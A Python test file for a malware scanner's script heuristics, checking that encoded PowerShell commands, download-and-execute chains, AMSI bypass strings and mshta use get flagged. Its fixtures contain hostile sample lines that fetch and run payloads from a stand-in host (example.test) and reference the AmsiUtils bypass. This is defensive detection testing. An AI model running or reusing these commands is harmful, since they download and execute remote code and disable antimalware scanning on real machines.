"""Tests for script heuristic synthesis."""

from __future__ import annotations

from malscan_worker.heuristics.script import build_script_heuristics


def test_build_script_heuristics_emits_expected_script_hits() -> None:
    features = {
        "text_preview": (
            "powershell -enc SQBtAG0AYQBsAGkAYwBpAG8AdQBzAA==\n"
            "Invoke-WebRequest https://example.test/payload.exe -OutFile payload.exe\n"
            "Start-Process payload.exe\n"
            "[Ref].Assembly.GetType('System.Management.Automation.AmsiUtils')\n"
            "mshta https://example.test/payload.hta\n"
        ),
        "encoded_strings": ["SQBtAG0AYQBsAGkAYwBpAG8AdQBzAA=="],
        "network_indicators": ["http_url", "web_request"],
        "download_operations": ["invoke_webrequest"],
        "exec_operations": ["start_process"],
        "process_operations": [],
        "registry_operations": [],
        "file_operations": [],
        "max_line_length": 640,
        "obfuscation_score": 78,
    }

    heuristics = build_script_heuristics(features)

    assert [heuristic.key for heuristic in heuristics] == [
        "script.encoded_command_execution",
        "script.amsi_bypass",
        "script.long_line_entropy_cluster",
        "script.download_execute_chain",
        "lolbin.execution_chain",
    ]
    assert heuristics[0].scope == "script"
    assert heuristics[0].evidence["encoded_strings"] == ("SQBtAG0AYQBsAGkAYwBpAG8AdQBzAA==",)
    assert heuristics[2].evidence["max_line_length"] == 640
    assert heuristics[3].evidence["download_operations"] == ("invoke_webrequest",)
    assert heuristics[4].scope == "script"


def test_build_script_heuristics_respects_scope_for_lnk_inputs() -> None:
    features = {
        "text_preview": (
            "powershell -enc SQBtAG0AYQBsAGkAYwBpAG8AdQBzAA== "
            "Invoke-WebRequest https://example.test/payload.exe && Start-Process payload.exe"
        ),
        "encoded_strings": ["SQBtAG0AYQBsAGkAYwBpAG8AdQBzAA=="],
        "network_indicators": ["http_url"],
        "download_operations": ["invoke_webrequest"],
        "exec_operations": ["start_process"],
        "process_operations": [],
        "registry_operations": [],
        "file_operations": [],
        "max_line_length": 0,
        "obfuscation_score": 24,
    }

    heuristics = build_script_heuristics(features, scope="lnk")

    assert [heuristic.key for heuristic in heuristics] == [
        "script.encoded_command_execution",
        "script.download_execute_chain",
        "lolbin.execution_chain",
    ]
    assert all(heuristic.scope == "lnk" for heuristic in heuristics)


def test_build_script_heuristics_ignores_weak_or_incomplete_features() -> None:
    features = {
        "text_preview": "powershell is documented here for administrators",
        "encoded_strings": [],
        "network_indicators": [],
        "download_operations": ["invoke_webrequest"],
        "exec_operations": [],
        "process_operations": [],
        "registry_operations": [],
        "file_operations": [],
        "max_line_length": 120,
        "obfuscation_score": 18,
    }

    heuristics = build_script_heuristics(features)

    assert heuristics == [
        build_script_heuristics(
            {"text_preview": "powershell is documented here for administrators"}
        )[0]
    ]
    assert heuristics[0].key == "lolbin.reference_only"


def test_build_script_heuristics_canonicalizes_evidence_lists_deterministically() -> None:
    features = {
        "text_preview": (
            "powershell -enc BBBB\n"
            "Invoke-WebRequest https://example.test/payload.exe\n"
            "Start-Process payload.exe\n"
        ),
        "encoded_strings": ["BBBB", "AAAA", "BBBB"],
        "network_indicators": ["web_request", "http_url", "web_request"],
        "download_operations": ["invoke_webrequest", "bitsadmin", "invoke_webrequest"],
        "exec_operations": ["start_process", "cmd_exec", "start_process"],
        "process_operations": ["create_process", "create_process"],
        "registry_operations": [],
        "file_operations": [],
        "max_line_length": 540,
        "obfuscation_score": 33,
    }

    heuristics = build_script_heuristics(features)
    heuristic_map = {heuristic.key: heuristic for heuristic in heuristics}

    assert heuristic_map["script.encoded_command_execution"].evidence["encoded_strings"] == (
        "AAAA",
        "BBBB",
    )
    assert heuristic_map["script.encoded_command_execution"].evidence["exec_operations"] == (
        "cmd_exec",
        "start_process",
    )
    assert heuristic_map["script.long_line_entropy_cluster"].evidence["encoded_strings"] == (
        "AAAA",
        "BBBB",
    )
    assert heuristic_map["script.download_execute_chain"].evidence["download_operations"] == (
        "bitsadmin",
        "invoke_webrequest",
    )
    assert heuristic_map["script.download_execute_chain"].evidence["network_indicators"] == (
        "http_url",
        "web_request",
    )
